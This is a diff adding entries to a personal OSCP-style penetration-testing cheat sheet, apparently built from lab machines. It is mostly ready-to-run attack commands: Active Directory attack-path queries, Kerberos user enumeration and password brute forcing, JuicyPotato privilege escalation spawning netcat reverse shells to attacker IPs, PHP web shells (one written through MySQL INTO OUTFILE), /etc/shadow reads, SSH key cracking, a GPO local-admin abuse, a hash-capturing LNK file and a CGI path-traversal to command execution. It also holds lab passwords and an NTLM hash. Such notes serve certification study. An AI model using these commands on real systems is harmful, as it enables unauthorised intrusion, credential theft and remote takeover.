@@ -8,6 +8,8 @@
 
 [0xsyr0](https://github.com/0xsyr0/OSCP)
 
+[krovs](https://krovs.github.io/oscp-notes/)
+
 ## autorecon
 
 ```jsx
@@ -197,12 +199,54 @@ bloodhound-python -u Fiona.Clarck -p Summer2023 -d nagoya-industries.com -v --zi
 ```
 If 'bloodhound-python' is not found you can use the command with the full path "sudo python /home/kali/.local/bin/bloodhound-python"
 
+```jsx
+MATCH p=shortestPath((n)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(g:Group))
+WHERE g.objectid ENDS WITH "-512" AND n<>g
+RETURN p
+```
+
 ## LDAP
 
 ```jsx
 ldapsearch -x -v -H "ldap://192.168.231.122" -D 'CN=Configuration,DC=hutch,DC=offsec' -W -b 'DC=hutch,DC=offsec' >ldapsearch.txt
 ldapsearch -v -x -b "DC=hokkaido-aerospace,DC=com" -H "ldap://$ip" "(objectclass=*)"
 nmap -n -sV --script "ldap* and not brute" 192.168.231.122
+nmap -sT -Pn -n --open 192.168.215.21 -p389 --script ldap-rootdse
+```
+
+```
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+
+    return $DirectorySearcher.FindAll()
+
+}
+```
+
+<aside>
+Import the file with:
+</aside>
+
+```jsx
+Import-Module .\function.ps1
+```
+
+<aside>
+Usage:
+</aside>
+
+```jsx
+$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Admin*))"
+$group.properties.member
 ```
 
 ## Kerberos
@@ -211,6 +255,8 @@ nmap -n -sV --script "ldap* and not brute" 192.168.231.122
 impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-GetUserSPNs -request -dc-ip 10.10.150.146 oscp.exam/web_svc
+./kerbrute_linux_amd64 userenum --dc 192.168.215.21 -d nagoya-industries.com names.txt
+./kerbrute_linux_amd64 bruteuser -d 'hokkaido-aerospace.com' --dc $IP /usr/share/wordlists/rockyou.txt <username>
 ```
 
 ## xp_cmdshell 
@@ -349,12 +395,22 @@ ssh -i 'id_rsa' john@192.168.202.149
 ```
 
 <aside>
- https://serverfault.com/questions/989678/locked-out-of-my-own-server-getting-too-many-authentication-failures-right-aw
+https://serverfault.com/questions/989678/locked-out-of-my-own-server-getting-too-many-authentication-failures-right-aw
 </aside>
 
 ```jsx
 ssh -o "IdentitiesOnly yes" -i root root@127.0.0.1
 ```
+
+<aside>
+If the file is still pwd protected
+</aside>
+
+```jsx
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+```
+
 
 ## SeImpersonatePrivilege
 
@@ -367,6 +423,10 @@ ssh -o "IdentitiesOnly yes" -i root root@127.0.0.1
 .\JuicyPotatoNG.exe -t * -p "C:\Users\Public\nc64.exe" -a "10.10.111.147 4444 -e cmd.exe"
 .\JuicyPotatoNG.exe -t * -p "C:\Users\tony\Desktop\rev.exe"
 ```
+
+<aside>
+List of CLSID's: https://github.com/ohpe/juicy-potato/tree/master/CLSID
+</aside>
 
 ```jsx
 .\Potatox86.exe -t * -p "C:\wamp\www\nc.exe" -a "192.168.45.158 1234 -e cmd.exe" -l 9090 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
@@ -407,6 +467,7 @@ Connect with NTLM hash and pass
 ```jsx
 evil-winrm -i 10.10.111.146 -u "tom_admin" -H 4979d69d4ca66955c075c41cf45f24dc
 evil-winrm -i 10.10.112.154 -u 'Administrator' -p 'hghgib6vHT3bVWf'
+evil-winrm -i 10.10.112.154 -r  <domain> -k <tgt-file-path>
 ```
 
 ## smbclient
@@ -419,7 +480,6 @@ prompt off
 recurse on
 mget *
 ```
-
 
 ## GPGOrchestrator
 
@@ -467,18 +527,212 @@ Check always https://gtfobins.github.io/
 /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
 
+## disk group
 
+<aside>
+More info on: [https://www.exploit-db.com/exploits/50558](https://www.hackingarticles.in/disk-group-privilege-escalation/)
+</aside>
 
+```jsx
+df /
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+mkdir test
+cat /etc/shadow
+```
 
+# PHP
 
+```jsx
+/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
+```
 
+```jsx
+<?php system($_GET["cmd"]);?>
+```
 
+## DNS
 
+```jsx
+dig @192.168.200.175 AXFR resourced.local
+dig srv _ldap._tcp.dc._msdcs.nagoya.nagoya-industries.com @192.168.215.21
+whois 192.168.200.175
+dnsenum 192.168.200.175
+```
 
+## RPC
 
+```jsx
+rpcclient 192.168.200.175 -N 
+rpcclient -U "" -N $IP
+dsr_getdcname
+dsr_getdcnameex
+dsr_getdcnameex2
+dsr_getsitename
+enumdata
+enumdomgroups
+enumdomusers
+enumjobs
+enumports
+enumprivs
+getanydcname
+getdcname
+lookupsids
+lsaenumsid <SID>
+lsaquery
+netconnenum
+netdiskenum
+netfileenum
+netsessenum
+netshareenum
+netshareenumall
+netsharegetinfo
+queryuser <USERNAME>
+srvinfo
+```
 
+## impacket-secretsdump
 
+```jsx
+impacket-rpcdump 192.168.215.21 > rpcdump.txt
+impacket-rpcdump 10.1.1.68 -p 135
+```
 
+## responder
+
+```jsx
+sudo responder -I tun0 -wv
+```
+
+## enum4linux
+
+```jsx
+enum4linux -a 192.168.221.189
+
+```
+
+## Squid
+
+<aside>
+More info: https://www.cyberlibrary.fr/en/docs/old/3128-pentesting-squid & http://michalszalkowski.com/security/pentesting-ports/3128-squid/
+</aside>
+
+```jsx
+nmap -p 3128 --script=http-open-proxy 192.168.221.189
+nikto -h 192.168.221.189 -p 3128
+python spose.py --proxy http://192.168.221.189:3128 --target 192.168.221.189
+```
+Add proxy in your browser to access the APP in the browser
+
+## GPO
+
+```jsx
+.\sharp.exe --AddLocalAdmin --UserAccount charlotte --GPOName "DEFAULT DOMAIN POLICY"
+gpupdate /force
+```
+
+## PowerView
+
+```jsx
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+powershell -ep bypass
+```
+
+```jsx
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetUser
+Get-DomainUser 
+Get-DomainUser | select cn
+Get-NetGroup | select name
+Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
+Get-NetUser -SPN
+Get-DomainUser -SPN | select name
+```
+
+## wpscan
+
+```jsx
+wpscan --url http://$IP/wp/
+wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
+```
+
+## wpscan
+
+```jsx
+impacket-wmiexec -shell-type powershell -dc-ip $IP 'medtech.com/yoshi:Mushroom!@172.16.160.82'
+```
+
+## RPD
+
+```jsx
+xfreerdp /u:offsec /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
+xfreerdp /u:offsec /d:oscp.lab /pth:<hash> +clipboard /cert:ignore
+```
+
+## SQL connection
+
+<aside>
+MySQL
+</aside>
+
+```jsx
+mysql -h $IP --ssl-verify-server-cert=FALSE -u <username>
+show databases;
+use <database>;
+show tables;
+describe <table_name>;
+select * from <table_name>;
+```
+
+<aside>
+PostgreSQL
+</aside>
+
+```jsx
+psql -h $IP -p 5432 -U postgres -W
+\list
+\c <database>
+\d
+\d+ users
+SELECT * FROM users;
+```
+
+## LNK file
+
+<aside>
+More info on: https://medium.com/@tayyabanoor1201/tcm-security-lnk-file-attack-writeup-9af506a6d577
+</aside>
+
+```jsx
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\192.168.92.132\~test.png"  # Pointing to the attacker's network resource
+$lnk.WindowStyle = 1  # Setting the window style to normal (1)
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"  # Assigning an icon to the shortcut
+$lnk.Description = "Test"  # Descriptive text for the shortcut
+$lnk.HotKey = "Ctrl+Alt+T"  # Setting a hotkey for the shortcut
+$lnk.Save()  # Saving the LNK file
+```
+
+## crackmapexec
+
+```jsx
+crackmapexec smb 192.168.226.172 -u guest -p "" --rid-brute
+crackmapexec smb $IP -u "guest" -p ""
+crackmapexec smb $IP --shares -u "guest" -p ""
+crackmapexec smb $IP --shares -u "" -p ""
+crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
+
+crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
+
+crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
+crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
+crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
+```
+
+## NXC
+
+Use https://github.com/seriotonctf/cme-nxc-cheat-sheet
 
 
 ## Misc
@@ -564,3 +818,43 @@ Extra data with strings
 strings /usr/local/bin/redis-status
 ```
 
+<aside>
+If basic commands on Win machine don't work like 'whoami'
+</aside>
+
+```jsx
+set PATH=C:\Windows\System32;C:\Windows;C:\Windows\System32\wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+```
+
+<aside>
+Shell in MySQL
+</aside>
+
+```jsx
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp/www/shell.php';
+```
+
+<aside>
+grep on Windows
+</aside>
+
+```jsx
+(Get-Content fileMonitorBackup.log) -match 'NTLM'
+```
+
+<aside>
+When running winpeas on windows and you do not see any colors, restart powershell after
+</aside>
+
+```jsx
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
+
+<aside>
+Directory traversal with Curl (which can lead to RCE)
+</aside>
+
+```jsx
+curl -v --path-as-is "http://192.168.202.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; whoami" "192.168.202.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+```
